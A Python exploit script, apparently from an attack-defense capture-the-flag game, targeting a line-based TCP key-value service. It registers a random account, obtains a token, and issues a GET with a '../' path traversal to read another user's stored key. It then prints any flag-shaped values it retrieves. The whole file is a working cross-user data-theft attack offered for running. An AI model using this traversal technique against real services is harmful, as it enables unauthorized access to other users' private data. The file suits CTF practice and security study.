import random
import re
import socket
import string
import sys

TIMEOUT = 5.0
FLAG_RE = re.compile(r"[A-Z0-9]{31}=")


class Client:
    def __init__(self, host, port, timeout=TIMEOUT):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.rf = self.sock.makefile("rb")

    def sendline(self, text):
        self.sock.sendall((text + "\n").encode("utf-8"))

    def readline(self):
        line = self.rf.readline()
        if not line:
            raise EOFError("connection closed")
        return line.decode("utf-8", "replace").rstrip("\r\n")

    def close(self):
        try:
            self.sock.sendall(b"QUIT\n")
        except Exception:
            pass
        try:
            self.rf.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass


def rand_str(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def exploit(host, port, flag_id):
    victim, key = flag_id.split("/", 1)
    flags = []

    c = Client(host, port)
    try:
        user = "x" + rand_str(15)
        pw = rand_str(16)

        c.sendline("REGISTER {} {}".format(user, pw))
        r = c.readline()
        token = None
        if r.startswith("OK "):
            token = r[3:].strip()
        else:
            c.sendline("AUTH {} {}".format(user, pw))
            r2 = c.readline()
            if r2.startswith("OK "):
                token = r2[3:].strip()
        if not token:
            return flags

        traversal_key = "../" + victim + "/" + key
        c.sendline("GET {} {}".format(token, traversal_key))
        r = c.readline()
        if r.startswith("OK "):
            value = r[3:]
            m = FLAG_RE.search(value)
            if m:
                flags.append(m.group(0))
            elif value:
                flags.append(value)
        return flags
    finally:
        c.close()


if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2])
    flag_id = sys.argv[3]
    for flag in exploit(host, port, flag_id):
        print(flag)
